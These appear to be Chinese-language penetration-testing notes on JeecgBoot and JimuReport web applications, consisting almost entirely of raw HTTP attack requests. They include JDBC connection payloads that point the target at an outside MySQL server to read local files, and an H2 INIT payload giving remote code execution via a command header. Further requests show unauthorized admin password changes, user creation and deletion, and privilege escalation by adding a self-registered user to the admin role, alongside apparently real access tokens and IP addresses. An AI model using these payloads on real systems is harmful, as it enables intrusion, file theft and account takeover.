jdbc测试，一般已经够了
```
POST /jeecgboot/online/cgreport/api/testConnection HTTP/1.1
Host: boot3.jeecg.com
Accept: application/json, text/plain, */*
X-Tenant-Id: 3
Accept-Language: zh-CN,zh;q=0.9
Content-Type: application/json;charset=UTF-8
Accept-Encoding: gzip, deflate
Cookie: Hm_lvt_0febd9e3cacb3f627ddac64d52caac39=1725197052,1725987964; HMACCOUNT=535ED347295800F6; Hm_lpvt_0febd9e3cacb3f627ddac64d52caac39=1726018533
X-Version: v3
X-TIMESTAMP: 1726018944138
Origin: http://boot3.jeecg.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYyOTA0NTUsInVzZXJuYW1lIjoiamVlY2cifQ.2XiVi9auSnCOtorcvZ0YHWwUJSaPx2T9EUZCk1lisWw
Cache-Control: no-cache
Pragma: no-cache
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYyOTA0NTUsInVzZXJuYW1lIjoiamVlY2cifQ.2XiVi9auSnCOtorcvZ0YHWwUJSaPx2T9EUZCk1lisWw
Referer: http://boot3.jeecg.com/monitor/datasource
X-Sign: D96B6145BFCE44FFFB2C01DCC711BD91
Content-Length: 269

{"dbType":"4","dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://47.109.58.205:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","dbUsername":"root","dbPassword":"11112221","dbName":"jeecg-boot"}
```
dbType为4或1

^
jdbc删除
```
DELETE /jeecgboot/sys/dataSource/delete?id=1833684696450519041 HTTP/1.1
Host: boot3.jeecg.com
X-TIMESTAMP: 1726019571825
X-Tenant-Id: 3
Accept-Language: zh-CN,zh;q=0.9
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYyOTA0NTUsInVzZXJuYW1lIjoiamVlY2cifQ.2XiVi9auSnCOtorcvZ0YHWwUJSaPx2T9EUZCk1lisWw
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYyOTA0NTUsInVzZXJuYW1lIjoiamVlY2cifQ.2XiVi9auSnCOtorcvZ0YHWwUJSaPx2T9EUZCk1lisWw
Cache-Control: no-cache
Content-Type: application/json;charset=UTF-8
Pragma: no-cache
X-Sign: DA0B4130AEE636CBDB0C01933F7B7599
X-Version: v3
Accept-Encoding: gzip, deflate
Origin: http://boot3.jeecg.com
Referer: http://boot3.jeecg.com/monitor/datasource
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept: application/json, text/plain, */*
Content-Length: 28

{"id":"1833684696450519041"}
```

jdbc添加
```
POST /jeecgboot/sys/dataSource/add HTTP/1.1
Host: boot3.jeecg.com
X-Sign: 2D5512C045713DB49125A2CA662EA222
X-TIMESTAMP: 1726019475703
Referer: http://boot3.jeecg.com/monitor/datasource
Accept-Encoding: gzip, deflate
Authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYyOTA0NTUsInVzZXJuYW1lIjoiamVlY2cifQ.2XiVi9auSnCOtorcvZ0YHWwUJSaPx2T9EUZCk1lisWw
Accept: application/json, text/plain, */*
X-Tenant-Id: 3
Origin: http://boot3.jeecg.com
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Pragma: no-cache
Cache-Control: no-cache
Content-Type: application/json;charset=UTF-8
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYyOTA0NTUsInVzZXJuYW1lIjoiamVlY2cifQ.2XiVi9auSnCOtorcvZ0YHWwUJSaPx2T9EUZCk1lisWw
X-Version: v3
Content-Length: 294

{"code":"11","name":"111","dbType":"4","dbDriver":"com.mysql.cj.jdbc.Driver","dbUrl":"jdbc:mysql://127.0.0.1:3306/jeecg-boot?characterEncoding=UTF-8&useUnicode=true&useSSL=false&tinyInt1isBit=false&allowPublicKeyRetrieval=true&serverTimezone=Asia/Shanghai","dbUsername":"11","dbPassword":"111"}
```

加用户
```
POST /cdxt-boot/sys/user/add HTTP/1.1
Host: 
Pragma: no-cache
Origin: 
Accept-Encoding: gzip, deflate
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYxMDQ4NTgsIm9yZ0lkIjoiTElTMjAxNzAzMjgwMDY2NDM5MzEiLCJ1c2VybmFtZSI6ImFkbWluIn0.M25DS1TOXo9FBkOEPSNaHSwWuU_ZYS-TJunwVVQfEcA
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Content-Length: 291

{"activitiSync":"1","isRemoteSpecialist":"0","username":"1111","password":"Byxe3312@","confirmpassword":"Byxe3312@","realname":"111111111","workNo":"1111111","birthday":"","avatar":null,"selectedroles":"","selecteddeparts":"","userIdentity":"1","departIds":"","orgId":"LIS20170328006643931"}
```

^
改密码，可以弱密码，可能越权修改管理员密码
```
PUT /cdxt-boot/sys/user/changePassword HTTP/1.1
Host: jia
Accept-Language: zh-CN,zh;q=0.9
Origin: http://jia
Accept-Encoding: gzip, deflate
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYxMDQ4NTgsIm9yZ0lkIjoiTElTMjAxNzAzMjgwMDY2NDM5MzEiLCJ1c2VybmFtZSI6ImFkbWluIn0.M25DS1TOXo9FBkOEPSNaHSwWuU_ZYS-TJunwVVQfEcA
Referer: http://ji
Content-Type: application/json;charset=UTF-8
Content-Length: 97

{"username":"admin","password":"123456byxe","confirmpassword":"123456byxe","orgId":"“}

有的可能要id来
{"id":"1815206694234484737","username":"ome","password":"123456","confirmpassword":"123456"}
```

删除用户delete
```
/cdxt-boot/sys/user/delete?id=1833706241834209281&orgId=LIS20170328006643931
```



^
RCE
```
POST /jmreport/testConnection HTTP/1.1
Host: x.x.x.x
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Connection: close
Content-Length: 8881
Accept-Encoding: gzip
Cmd: echo "2ZTvHsq4au3uOQ2mK9OuJb86rdO"
Content-Type: application/json

{
  "id": "1",
  "code": "ABC",
  "dbType": "MySQL",
  "dbDriver": "org.h2.Driver",
  "dbUrl": "jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS EXEC AS 'void shellexec(String b) throws Exception {byte[] bytes; try {bytes=java.util.Base64.getDecoder().decode(b);} catch (Exception e) {e.printStackTrace(); bytes=javax.xml.bind.DatatypeConverter.parseBase64Binary(b);} java.lang.reflect.Method defineClassMethod = java.lang.ClassLoader.class.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class); defineClassMethod.setAccessible(true); Class clz=(Class)defineClassMethod.invoke(new javax.management.loading.MLet(new java.net.URL[0], java.lang.Thread.currentThread().getContextClassLoader()), bytes, 0, bytes.length); clz.newInstance();}';",
  "dbName": "383BAb7deFC825E6",
  "dbPassword": "2ZTvHsq4au3uOQ2mK9OuJb86rdO",
  "userName": "2ZTvHsq4au3uOQ2mK9OuJb86rdO"
}
```


^
## **注册和越权**

用户注册，大概率可以水平越权和权限提升。
```
/api/jeecg-system/sms
POST /jeecg-boot/sys/user/register HTTP/1.1
Host: www.scom
accept: */*
Content-Type: application/json
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Origin: chrome-extension://liacakmdhalagfjlfdofigfoiocghoej
Content-Length: 77

{
  "companyName": "1354320251801604098",
  "password": "cb362cfeefbf3d8d",
  "phone": "17738814259",
  "username": "test3312",
  "smscode":"111111"
}
6位数验证码
```
短信验证码获取
```
POST /jeecg-boot/sys/sms HTTP/1.1
Host: 221.237.108.143:8088
Content-Type: application/json;charset=UTF-8
Referer: http:/com.cn:5096/user/register
Accept-Language: zh-CN,zh;q=0.9
Pragma: no-cache
Accept-Encoding: gzip, deflate
Cache-Control: no-cache
Accept: application/json, text/plain, */*
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Origin: http://wwwcom.cn:5096
Content-Length: 38

{"mobile":"1861323651","smsmode":"1"}
```
找回密码
```
/jeecg-system/sys/getForgetSmsByPhone?phone=17738814292
```

查询管理员组的ID
```
/api/sys/role/list
如：
f6817f48af4fb3af11b9e8bf182f618b
```
查询在管理员组的用户ID
```
/api/sys/user/list?roleId=f6817f48af4fb3af11b9e8bf182f618b
/api/sys/user/userRoleList?roleId=f6817f48af4fb3af11b9e8bf182f618b
```
加入自己的用户id到管理员组
查询自己的用户id在登录时有，或者/api/sys/user/list，或看看jwt里面有没有。
```
POST /api/sys/user/addSysUserRole HTTP/1.1
Host: demo.te
Connection: keep-alive
Content-Length: 82
Content-Type: application/json;charset=UTF-8
Accept: application/json, text/plain, */*
tenant_id: 0
X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYxNTI4NzMsInVzZXJuYW1lIjoieGUzMzEyIn0.tQsB390dLPXc0gujMJMilYkNmi0iZk1b4REJNFephLU

{"roleId":"f6817f48af4fb3af11b9e8bf182f618b","userIdList":["1833892347184689154"]}
```
查看有权限菜单
```
/api/sys/permission/getUserPermissionByToken?&token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYxNTI4NzMsInVzZXJuYW1lIjoieGUzMzEyIn0.tQsB390dLPXc0gujMJMilYkNmi0iZk1b4REJNFephL
```











^
## **积木报表**
jdbc
```
POST /jmreport/testConnection HTTP/1.1
Host: 173.159.173:8095
Origin: http://173.159.173:8095
Content-Type: application/json;charset=UTF-8
X-Access-Token: null
Accept: application/json, text/plain, */*
Cache-Control: no-cache
token: null
X-Tenant-Id: null
Accept-Language: zh-CN,zh;q=0.9
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate
Pragma: no-cache
JmReport-Tenant-Id: null
Content-Length: 198

{"dbType":"MYSQL5.5","dbDriver":"com.mysql.jdbc.Driver","dbUrl":"jdbc:mysql://47.109.58.205:3306/test2?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","dbUsername":"root","dbPassword":"*****"}
```